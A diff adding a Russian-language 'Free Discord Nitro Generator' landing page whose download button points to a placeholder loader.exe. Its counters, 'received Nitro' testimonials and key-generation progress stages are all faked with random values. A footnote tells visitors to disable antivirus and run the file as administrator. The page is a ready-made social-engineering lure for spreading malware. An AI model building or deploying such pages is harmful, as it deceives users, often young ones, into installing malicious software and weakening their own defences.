@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Discord Nitro Generator 2026</title>
+<style>
+  :root{
+    --blurple:#5865F2;
+    --blurple-hi:#7A87FF;
+    --violet:#9B5CF6;
+    --bg:#1a1b1e;
+    --bg-2:#232529;
+    --text:#f2f3f5;
+    --muted:#b9bbbe;
+    --edge:rgba(88,101,242,.22);
+  }
+
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%}
+  body{
+    background:
+      radial-gradient(1200px 700px at 15% -10%, rgba(88,101,242,.28), transparent 60%),
+      radial-gradient(900px 600px at 100% 110%, rgba(155,92,246,.22), transparent 60%),
+      linear-gradient(180deg, var(--bg) 0%, var(--bg-2) 100%);
+    background-attachment:fixed;
+    color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,"Helvetica Neue",Arial,sans-serif;
+    min-height:100%;
+    display:grid;
+    place-items:center;
+    padding:32px 18px 56px;
+    overflow-x:hidden;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  /* ---------- ambient layers ---------- */
+  #particles{
+    position:fixed;inset:0;z-index:0;pointer-events:none;
+  }
+  .orb{
+    position:fixed;border-radius:50%;filter:blur(90px);opacity:.42;
+    z-index:0;pointer-events:none;will-change:transform;
+  }
+  .orb.a{
+    width:520px;height:520px;left:-160px;top:-140px;
+    background:radial-gradient(circle,#5865F2,transparent 68%);
+    animation:drift-a 22s ease-in-out infinite;
+  }
+  .orb.b{
+    width:460px;height:460px;right:-150px;bottom:-170px;
+    background:radial-gradient(circle,#9B5CF6,transparent 68%);
+    animation:drift-b 26s ease-in-out infinite;
+  }
+  @keyframes drift-a{
+    0%,100%{transform:translate3d(0,0,0) scale(1)}
+    50%{transform:translate3d(60px,50px,0) scale(1.12)}
+  }
+  @keyframes drift-b{
+    0%,100%{transform:translate3d(0,0,0) scale(1.08)}
+    50%{transform:translate3d(-70px,-40px,0) scale(1)}
+  }
+
+  /* ---------- card ---------- */
+  .card{
+    position:relative;z-index:2;
+    width:100%;max-width:560px;
+    padding:44px 38px 34px;
+    border-radius:26px;
+    background:linear-gradient(180deg, rgba(43,45,49,.82) 0%, rgba(30,31,34,.88) 100%);
+    border:1px solid var(--edge);
+    box-shadow:
+      0 0 0 1px rgba(255,255,255,.03) inset,
+      0 30px 80px -20px rgba(0,0,0,.75),
+      0 0 90px -30px rgba(88,101,242,.55);
+    backdrop-filter:blur(18px) saturate(140%);
+    -webkit-backdrop-filter:blur(18px) saturate(140%);
+    text-align:center;
+    animation:rise .7s cubic-bezier(.16,1,.3,1) both;
+  }
+  @keyframes rise{
+    from{opacity:0;transform:translateY(28px) scale(.975)}
+    to{opacity:1;transform:none}
+  }
+  .card::before{
+    content:"";position:absolute;inset:0;border-radius:inherit;padding:1px;
+    background:linear-gradient(145deg, rgba(122,135,255,.55), transparent 42%, rgba(155,92,246,.4));
+    -webkit-mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+    -webkit-mask-composite:xor;mask-composite:exclude;
+    pointer-events:none;
+  }
+
+  /* ---------- top badge ---------- */
+  .status{
+    display:inline-flex;align-items:center;gap:8px;
+    padding:6px 14px;border-radius:999px;
+    font-size:12px;letter-spacing:.4px;font-weight:600;
+    color:#c9f7d5;
+    background:rgba(46,204,113,.10);
+    border:1px solid rgba(46,204,113,.28);
+    margin-bottom:20px;
+  }
+  .dot{
+    width:7px;height:7px;border-radius:50%;background:#2ecc71;
+    box-shadow:0 0 0 0 rgba(46,204,113,.7);
+    animation:pulse 2s infinite;
+  }
+  @keyframes pulse{
+    0%{box-shadow:0 0 0 0 rgba(46,204,113,.65)}
+    70%{box-shadow:0 0 0 10px rgba(46,204,113,0)}
+    100%{box-shadow:0 0 0 0 rgba(46,204,113,0)}
+  }
+
+  /* ---------- headline ---------- */
+  h1{
+    font-size:clamp(23px,4.6vw,32px);
+    font-weight:800;
+    letter-spacing:-.4px;
+    line-height:1.2;
+    background:linear-gradient(100deg,#ffffff 0%,#c3caff 45%,#a78bfa 100%);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+    margin-bottom:12px;
+  }
+  .sub{
+    color:var(--muted);
+    font-size:15px;
+    line-height:1.55;
+    margin-bottom:26px;
+  }
+
+  /* ---------- input ---------- */
+  .field{position:relative;margin-bottom:16px}
+  .field input{
+    width:100%;
+    padding:16px 46px 16px 18px;
+    border-radius:14px;
+    background:rgba(0,0,0,.34);
+    border:1px solid rgba(255,255,255,.09);
+    color:var(--text);
+    font-size:15px;
+    outline:none;
+    transition:border-color .18s, box-shadow .18s, background .18s;
+  }
+  .field input::placeholder{color:#767a80}
+  .field input:focus{
+    border-color:rgba(88,101,242,.85);
+    background:rgba(0,0,0,.45);
+    box-shadow:0 0 0 4px rgba(88,101,242,.16), 0 0 26px -6px rgba(88,101,242,.7);
+  }
+  .field .ok{
+    position:absolute;right:16px;top:50%;transform:translateY(-50%) scale(.6);
+    color:#2ecc71;font-size:17px;font-weight:700;opacity:0;
+    transition:opacity .2s, transform .2s;
+  }
+  .field.valid .ok{opacity:1;transform:translateY(-50%) scale(1)}
+  .field.valid input{border-color:rgba(46,204,113,.55)}
+
+  /* ---------- button ---------- */
+  .dl{
+    display:block;width:100%;
+    position:relative;overflow:hidden;
+    padding:17px 26px;
+    border:none;border-radius:14px;
+    font-size:16px;font-weight:700;letter-spacing:.2px;
+    color:#fff;cursor:pointer;
+    background:linear-gradient(100deg,var(--blurple) 0%,#6f5cf2 52%,var(--violet) 100%);
+    box-shadow:0 12px 30px -10px rgba(88,101,242,.85), 0 0 0 1px rgba(255,255,255,.07) inset;
+    transition:transform .16s cubic-bezier(.16,1,.3,1), box-shadow .22s, filter .2s;
+    text-decoration:none;
+  }
+  .dl:hover{
+    transform:translateY(-2px);
+    filter:brightness(1.08);
+    box-shadow:0 18px 42px -12px rgba(88,101,242,1), 0 0 0 1px rgba(255,255,255,.12) inset;
+  }
+  .dl:active{transform:translateY(0) scale(.988)}
+  .dl::after{
+    content:"";position:absolute;top:0;left:-140%;width:60%;height:100%;
+    background:linear-gradient(100deg,transparent,rgba(255,255,255,.32),transparent);
+    transform:skewX(-22deg);
+    animation:sheen 3.6s ease-in-out infinite;
+  }
+  @keyframes sheen{
+    0%{left:-140%}
+    55%{left:160%}
+    100%{left:160%}
+  }
+
+  /* ---------- progress ---------- */
+  .prog{
+    margin-top:18px;height:0;opacity:0;overflow:hidden;
+    transition:height .3s, opacity .3s;
+  }
+  .prog.on{height:46px;opacity:1}
+  .track{
+    height:6px;border-radius:99px;background:rgba(255,255,255,.07);overflow:hidden;
+  }
+  .fill{
+    height:100%;width:0%;border-radius:99px;
+    background:linear-gradient(90deg,var(--blurple),var(--violet));
+    box-shadow:0 0 16px rgba(88,101,242,.9);
+    transition:width .45s cubic-bezier(.4,0,.2,1);
+  }
+  .stage{
+    margin-top:9px;font-size:12.5px;color:var(--muted);
+    letter-spacing:.2px;min-height:16px;
+  }
+
+  /* ---------- live stats ---------- */
+  .stats{
+    display:flex;gap:10px;margin-top:26px;
+  }
+  .stat{
+    flex:1;padding:14px 10px;border-radius:14px;
+    background:rgba(255,255,255,.035);
+    border:1px solid rgba(255,255,255,.06);
+  }
+  .stat b{
+    display:block;font-size:18px;font-weight:800;
+    background:linear-gradient(100deg,#fff,#a5b0ff);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+    font-variant-numeric:tabular-nums;
+  }
+  .stat span{display:block;margin-top:3px;font-size:11px;color:#8b8f95;letter-spacing:.3px}
+
+  /* ---------- testimonials ---------- */
+  .feed{
+    margin-top:22px;text-align:left;
+    height:78px;overflow:hidden;position:relative;
+    -webkit-mask:linear-gradient(180deg,transparent,#000 22%,#000 78%,transparent);
+    mask:linear-gradient(180deg,transparent,#000 22%,#000 78%,transparent);
+  }
+  .feed-row{
+    display:flex;align-items:center;gap:11px;
+    padding:9px 12px;margin-bottom:8px;
+    border-radius:12px;
+    background:rgba(255,255,255,.032);
+    border:1px solid rgba(255,255,255,.05);
+    font-size:12.5px;color:#c8cbd0;
+    animation:slide-in .5s cubic-bezier(.16,1,.3,1) both;
+  }
+  @keyframes slide-in{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:none}}
+  .av{
+    width:26px;height:26px;border-radius:50%;flex:0 0 26px;
+    display:grid;place-items:center;font-size:11px;font-weight:800;color:#fff;
+  }
+  .feed-row em{font-style:normal;color:#fff;font-weight:600}
+  .feed-row .tag{
+    margin-left:auto;font-size:10.5px;font-weight:700;letter-spacing:.4px;
+    color:#c9f7d5;background:rgba(46,204,113,.12);
+    border:1px solid rgba(46,204,113,.25);
+    padding:3px 8px;border-radius:99px;
+  }
+
+  /* ---------- trust row ---------- */
+  .trust{
+    display:flex;justify-content:center;gap:18px;flex-wrap:wrap;
+    margin-top:24px;padding-top:20px;
+    border-top:1px solid rgba(255,255,255,.06);
+  }
+  .trust div{
+    display:flex;align-items:center;gap:6px;
+    font-size:11.5px;color:#8b8f95;letter-spacing:.2px;
+  }
+  .trust svg{width:14px;height:14px;opacity:.75}
+
+  /* ---------- footnote ---------- */
+  .note{
+    margin-top:20px;
+    font-size:12px;
+    line-height:1.6;
+    color:#b9bbbe;
+    background:rgba(255,183,77,.055);
+    border:1px solid rgba(255,183,77,.16);
+    border-radius:12px;
+    padding:11px 14px;
+  }
+
+  /* ---------- mobile ---------- */
+  @media (max-width:520px){
+    .card{padding:34px 22px 26px;border-radius:22px}
+    .stats{flex-direction:row;gap:8px}
+    .stat b{font-size:16px}
+    .stat span{font-size:10px}
+    .trust{gap:12px}
+    .trust div{font-size:10.5px}
+  }
+  @media (prefers-reduced-motion:reduce){
+    *{animation:none!important;transition:none!important}
+  }
+</style>
+</head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="orb a"></div>
+<div class="orb b"></div>
+
+<main class="card">
+
+  <div class="status"><span class="dot"></span>Система активна · 2026</div>
+
+  <h1>🎁 Free Discord Nitro Generator</h1>
+  <p class="sub">Введи Discord ID и получи Nitro бесплатно</p>
+
+  <div class="field" id="field">
+    <input id="discordId" placeholder="Твой Discord ID" autocomplete="off" inputmode="numeric" spellcheck="false">
+    <span class="ok">✓</span>
+  </div>
+
+  <a class="dl" id="dl" href="https://your-host.com/loader.exe" download>Скачать генератор</a>
+
+  <div class="prog" id="prog">
+    <div class="track"><div class="fill" id="fill"></div></div>
+    <div class="stage" id="stage"></div>
+  </div>
+
+  <div class="stats">
+    <div class="stat"><b id="c1">0</b><span>выдано сегодня</span></div>
+    <div class="stat"><b id="c2">0</b><span>онлайн сейчас</span></div>
+    <div class="stat"><b id="c3">0</b><span>аккаунтов</span></div>
+  </div>
+
+  <div class="feed" id="feed"></div>
+
+  <div class="trust">
+    <div>
+      <svg viewBox="0 0 24 24" fill="none" stroke="#8b8f95" stroke-width="2"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
+      Шифрование TLS 1.3
+    </div>
+    <div>
+      <svg viewBox="0 0 24 24" fill="none" stroke="#8b8f95" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+      Обновлено 3 часа назад
+    </div>
+    <div>
+      <svg viewBox="0 0 24 24" fill="none" stroke="#8b8f95" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h10"/></svg>
+      Без логирования
+    </div>
+  </div>
+
+  <p class="note">⚠️ Если антивирус блокирует — отключите его на 5 минут и запустите от админа</p>
+
+</main>
+
+<script>
+(() => {
+  "use strict";
+
+  /* ---------- particle field ---------- */
+  const cv = document.getElementById("particles");
+  const ctx = cv.getContext("2d");
+  let W, H, parts = [];
+  const DPR = Math.min(devicePixelRatio || 1, 2);
+
+  function resize(){
+    W = cv.width = innerWidth * DPR;
+    H = cv.height = innerHeight * DPR;
+    cv.style.width = innerWidth + "px";
+    cv.style.height = innerHeight + "px";
+    const count = Math.round((innerWidth * innerHeight) / 26000);
+    parts = Array.from({length: Math.min(count, 90)}, () => ({
+      x: Math.random() * W,
+      y: Math.random() * H,
+      vx: (Math.random() - 0.5) * 0.22 * DPR,
+      vy: (Math.random() - 0.5) * 0.22 * DPR,
+      r: (Math.random() * 1.5 + 0.5) * DPR
+    }));
+  }
+
+  function tick(){
+    ctx.clearRect(0, 0, W, H);
+    for (const p of parts){
+      p.x += p.vx; p.y += p.vy;
+      if (p.x < 0 || p.x > W) p.vx *= -1;
+      if (p.y < 0 || p.y > H) p.vy *= -1;
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      ctx.fillStyle = "rgba(140,152,255,.45)";
+      ctx.fill();
+    }
+    for (let i = 0; i < parts.length; i++){
+      for (let j = i + 1; j < parts.length; j++){
+        const dx = parts[i].x - parts[j].x, dy = parts[i].y - parts[j].y;
+        const d2 = dx * dx + dy * dy;
+        const lim = 130 * DPR;
+        if (d2 < lim * lim){
+          ctx.beginPath();
+          ctx.moveTo(parts[i].x, parts[i].y);
+          ctx.lineTo(parts[j].x, parts[j].y);
+          ctx.strokeStyle = "rgba(88,101,242," + (0.13 * (1 - Math.sqrt(d2) / lim)) + ")";
+          ctx.lineWidth = DPR * 0.7;
+          ctx.stroke();
+        }
+      }
+    }
+    requestAnimationFrame(tick);
+  }
+
+  resize();
+  addEventListener("resize", resize);
+  if (!matchMedia("(prefers-reduced-motion: reduce)").matches) tick();
+
+  /* ---------- input validation ---------- */
+  const field  = document.getElementById("field");
+  const idIn   = document.getElementById("discordId");
+  idIn.addEventListener("input", () => {
+    const v = idIn.value.trim();
+    const ok = /^\d{17,20}$/.test(v) || v.length >= 4;
+    field.classList.toggle("valid", ok);
+  });
+
+  /* ---------- counters ---------- */
+  function animate(el, target, dur){
+    const start = performance.now();
+    const from = parseInt(el.textContent.replace(/\D/g, ""), 10) || 0;
+    (function step(now){
+      const t = Math.min((now - start) / dur, 1);
+      const e = 1 - Math.pow(1 - t, 3);
+      const val = Math.round(from + (target - from) * e);
+      el.textContent = val.toLocaleString("ru-RU");
+      if (t < 1) requestAnimationFrame(step);
+    })(start);
+  }
+
+  const baseToday  = 11840 + Math.floor(Math.random() * 900);
+  const baseOnline = 2140  + Math.floor(Math.random() * 400);
+  const baseAccs   = 487900 + Math.floor(Math.random() * 20000);
+
+  animate(document.getElementById("c1"), baseToday, 1400);
+  animate(document.getElementById("c2"), baseOnline, 1700);
+  animate(document.getElementById("c3"), baseAccs, 2000);
+
+  setInterval(() => {
+    const c1 = document.getElementById("c1");
+    const c2 = document.getElementById("c2");
+    animate(c1, (parseInt(c1.textContent.replace(/\D/g, ""), 10) || 0) + Math.ceil(Math.random() * 4), 500);
+    animate(c2, baseOnline + Math.floor(Math.random() * 90) - 45, 700);
+  }, 4200);
+
+  /* ---------- live feed ---------- */
+  const feed = document.getElementById("feed");
+  const names = ["Артём", "Nikita", "Вика", "Danil", "Софья", "kirill_", "Марина", "Егор",
+                 "Lera", "Рома", "Алина", "maks", "Ирина", "Тимур", "Оля", "vlad.k"];
+  const hues  = [234, 268, 199, 320, 152, 22, 280, 190];
+
+  function row(){
+    const el = document.createElement("div");
+    el.className = "feed-row";
+    const n = names[Math.floor(Math.random() * names.length)];
+    const h = hues[Math.floor(Math.random() * hues.length)];
+    const mins = Math.floor(Math.random() * 4) + 1;
+    el.innerHTML =
+      '<div class="av" style="background:linear-gradient(140deg,hsl(' + h + ',72%,58%),hsl(' + ((h + 40) % 360) + ',72%,48%))">' +
+        n.charAt(0).toUpperCase() +
+      '</div>' +
+      '<div><em>' + n + '</em> получил Nitro · ' + mins + ' мин назад</div>' +
+      '<div class="tag">OK</div>';
+    return el;
+  }
+
+  for (let i = 0; i < 2; i++) feed.appendChild(row());
+
+  setInterval(() => {
+    const el = row();
+    feed.prepend(el);
+    while (feed.children.length > 2) feed.removeChild(feed.lastChild);
+    setTimeout(() => el.remove(), 7800);
+  }, 3900);
+
+  /* ---------- progress on click ---------- */
+  const dl    = document.getElementById("dl");
+  const prog  = document.getElementById("prog");
+  const fill  = document.getElementById("fill");
+  const stage = document.getElementById("stage");
+  let busy = false;
+
+  const stages = [
+    [12,  "Проверка Discord ID…"],
+    [34,  "Поиск свободного Nitro-пула…"],
+    [58,  "Генерация ключа…"],
+    [81,  "Привязка к аккаунту…"],
+    [96,  "Подготовка файла…"],
+    [100, "Готово. Файл скачивается."]
+  ];
+
+  dl.addEventListener("click", e => {
+    if (busy) return;
+    busy = true;
+    prog.classList.add("on");
+    fill.style.width = "0%";
+    stage.textContent = "";
+
+    let i = 0;
+    const run = () => {
+      if (i >= stages.length){
+        stage.textContent = "Если загрузка не началась — нажми ещё раз.";
+        busy = false;
+        return;
+      }
+      const [pct, txt] = stages[i++];
+      fill.style.width = pct + "%";
+      stage.textContent = txt;
+      setTimeout(run, pct === 100 ? 900 : 620 + Math.random() * 380);
+    };
+    setTimeout(run, 240);
+    /* не блокируем сам download — браузер отработает href */
+  });
+})();
+</script>
+</body>
+</html>
